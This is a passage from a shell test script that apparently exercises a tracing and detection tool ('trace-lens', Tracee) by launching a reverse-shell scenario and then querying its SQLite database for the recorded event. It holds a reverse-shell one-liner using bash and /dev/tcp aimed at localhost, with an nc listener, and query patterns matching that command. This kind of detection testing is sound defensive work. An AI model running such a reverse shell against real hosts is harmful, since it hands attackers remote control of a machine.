...
DB_PATH="${DB_PATH:-${ROOT_DIR}/db/trace-lens-h1-02.db}"
WORK_DIR="${ROOT_DIR}/runtime/h1-02-bash-i"
TRACEE_OUTPUT="${WORK_DIR}/tracee.ndjson"
REPORT_DIR="${WORK_DIR}/exports"
TCP_PORT="${TCP_PORT:-19092}"
...
if ! command -v nc >/dev/null 2>&1; then
  echo "nc is required for the reverse-shell listener" >&2
  exit 1
fi
...
SCENARIO_CMD="bash -i >& /dev/tcp/127.0.0.1/${TCP_PORT} 0>&1"
...
where source_kind='tracee' \
  ...
  and payload_json like '%bash -i%' \
  and payload_json like '%/dev/tcp/127.0.0.1/${TCP_PORT}%' \
order by observed_at desc limit 1;"
ROOT_PID="$(sqlite3 "${DB_PATH}" "${PID_QUERY}")"

if [[ -z "${ROOT_PID}" ]]; then
  echo "failed to locate the root pid for H1-02 scenario" >&2
  exit 1
fi
